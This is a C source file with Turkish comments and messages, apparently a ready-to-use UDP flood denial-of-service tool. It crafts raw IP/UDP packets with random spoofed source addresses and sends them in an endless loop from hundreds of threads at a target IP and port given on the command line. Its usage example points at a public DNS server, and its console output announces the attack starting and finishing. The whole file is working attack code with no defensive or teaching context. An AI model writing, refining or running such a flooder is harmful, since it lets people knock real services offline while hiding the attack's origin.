#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <time.h>
#include <pthread.h>
#include <signal.h>

#define PAYLOAD_SIZE 1400
#define THREAD_PER_PROCESS 100

volatile int calis = 1;
char hedef_ip[16];
int hedef_port;
int sure;

unsigned short checksum(unsigned short *ptr, int n) {
    long sum = 0;
    while (n > 1) { sum += *ptr++; n -= 2; }
    if (n) sum += *(unsigned char *)ptr;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

void *udp_gonder(void *arg) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return NULL;
    
    int opt = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(hedef_port);
    inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
    
    char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD_SIZE];
    memset(packet, 0, sizeof(packet));
    
    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *payload = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    memset(payload, 'X', PAYLOAD_SIZE);
    
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(packet));
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    ip->daddr = dst.sin_addr.s_addr;
    
    udp->len = htons(sizeof(struct udphdr) + PAYLOAD_SIZE);
    
    while (calis) {
        ip->id = htons(rand() % 65535);
        ip->saddr = rand();
        udp->source = htons(rand() % 65535 + 1024);
        ip->check = 0;
        ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));
        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&dst, sizeof(dst));
    }
    close(sock);
    return NULL;
}

void sig_handler(int sig) {
    calis = 0;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Kullanım: %s <IP> <PORT> <SANIYE>\n", argv[0]);
        printf("Örnek: %s 8.8.8.8 53 60\n", argv[0]);
        return 1;
    }
    
    strcpy(hedef_ip, argv[1]);
    hedef_port = atoi(argv[2]);
    sure = atoi(argv[3]);
    
    signal(SIGINT, sig_handler);
    srand(time(NULL));
    
    int process_count = sysconf(_SC_NPROCESSORS_ONLN) * 2;
    printf("[+] Hedef: %s:%d\n", hedef_ip, hedef_port);
    printf("[+] Süre: %d saniye\n", sure);
    printf("[+] İşlem: %d, Thread/işlem: %d\n", process_count, THREAD_PER_PROCESS);
    printf("[+] Saldırı başladı. Durdurmak için Ctrl+C\n");
    
    pthread_t threads[process_count * THREAD_PER_PROCESS];
    int thread_index = 0;
    
    for (int i = 0; i < process_count; i++) {
        for (int j = 0; j < THREAD_PER_PROCESS; j++) {
            pthread_create(&threads[thread_index++], NULL, udp_gonder, NULL);
        }
    }
    
    time_t baslangic = time(NULL);
    while (time(NULL) - baslangic < sure && calis) {
        sleep(1);
    }
    
    calis = 0;
    sleep(1);
    printf("[+] Saldırı tamamlandı.\n");
    return 0;
}
